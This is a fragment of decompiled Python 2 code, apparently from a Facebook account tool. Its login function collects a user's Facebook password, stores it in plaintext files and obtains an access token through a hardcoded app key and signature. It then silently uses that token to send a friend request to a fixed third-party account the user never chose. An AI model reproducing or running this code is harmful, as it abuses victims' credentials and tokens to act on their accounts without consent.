#Decompiled At:Thu Mar 12 20:22:00 2020 



def login():
    os.system('reset')
    try:
        toket = open('cookie', 'r')
        menu()
    except (KeyError, IOError):
        os.system('reset')
        print logo
        print ''
        id = raw_input('\x1b[1;91m[+] \x1b[1;36musername\x1b[1;97m \x1b[1;91m:\x1b[1;92m ')
        use = open('user.txt', 'w')
        use.write(id)
        use.close()
        pwd = raw_input('\x1b[1;91m[+] \x1b[1;36mpassword \x1b[1;91m:\x1b[1;92m ')
        pw = open('pw.txt', 'w')
        pw.write(pwd)
        pw.close()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\x1b[1;91m[!] No connection'
            os.system('rm -rf user.txt;rm -rf pw.txt')
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                gazz = open('cookie', 'w')
                gazz.write(z['access_token'])
                gazz.close()
                tik()
                print '\n\x1b[1;91m[\x1b[1;96m?\x1b[1;91m] \x1b[1;92mLogin successfully'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=angga.pro.980967&access_token=' + z['access_token'])
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] No connection'
                os.system('rm -rf user.txt;rm -rf pw.txt')
                keluar()

        if 'checkpoint' in url:
            tik()
            print '\n\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
            os.system('rm -rf cookie;rm -rf user.txt;rm -rf pw.txt')
            time.sleep(1)
            keluar()
        else:
            tik()
            print '\n\x1b[1;91m[!] Login Failed'
            os.system('rm -rf cookie;rm -rf user.txt;rm -rf pw.txt')
            time.sleep(1)
            login()


